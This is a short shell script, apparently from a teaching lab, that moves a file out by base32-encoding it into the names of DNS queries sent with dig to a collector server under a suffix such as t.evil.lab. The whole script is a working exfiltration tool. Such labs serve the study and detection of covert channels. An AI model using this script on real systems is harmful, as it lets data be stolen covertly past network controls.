#!/bin/sh
# Move a file out inside the names of DNS queries.
#
# This is what selftest.sh and reset.sh use to move a whole file without a human
# typing every chunk. It takes NO default addresses, zone or file: running it
# still means naming the server to query, the fixed name suffix the collector
# watches, and the file. The handout never names this script (handout rule 8):
# a learner drives the channel with base32 and dig by hand, which is the point
# of Part 1.
#
#   dns-exfil <server-ip> <suffix> <file>
#
# <server-ip> is either the collector directly (the "direct" transport) or the
# local resolver (the "via the resolver" transport); the script does not care
# which, because the only difference is who the queries are sent to. <suffix> is
# the fixed tail every data name ends with, e.g. t.evil.lab. Each query is
#
#   <chunk>.<seq>.<suffix>
#
# where <chunk> is up to 40 base32 characters of the file and <seq> is its
# position. base32's A-Z2-7 alphabet is all legal DNS label characters, so a
# chunk sits in a name unescaped; the '=' padding is dropped here and restored
# by the collector.
set -eu

SERVER="${1:?usage: dns-exfil <server-ip> <suffix> <file>}"
SUFFIX="${2:?usage: dns-exfil <server-ip> <suffix> <file>}"
FILE="${3:?usage: dns-exfil <server-ip> <suffix> <file>}"
[ -f "$FILE" ] || { echo "dns-exfil: no such file: $FILE" >&2; exit 1; }

# One line of at most 40 base32 characters per chunk, padding stripped.
data="$( base32 -w0 < "$FILE" | tr -d '=' )"

seq=0
echo "$data" | fold -w40 | while IFS= read -r chunk; do
    [ -n "$chunk" ] || continue
    dig +short +time=2 +tries=1 "@${SERVER}" "${chunk}.${seq}.${SUFFIX}" A >/dev/null 2>&1 || true
    seq=$(( seq + 1 ))
done

# The loop above runs in a pipeline subshell, so its final seq is not visible
# here; count the chunks separately for the summary line.
nq="$( echo "$data" | fold -w40 | grep -c . )"
echo "dns-exfil: sent ${nq} queries carrying $( wc -c < "$FILE" ) bytes to $SERVER"
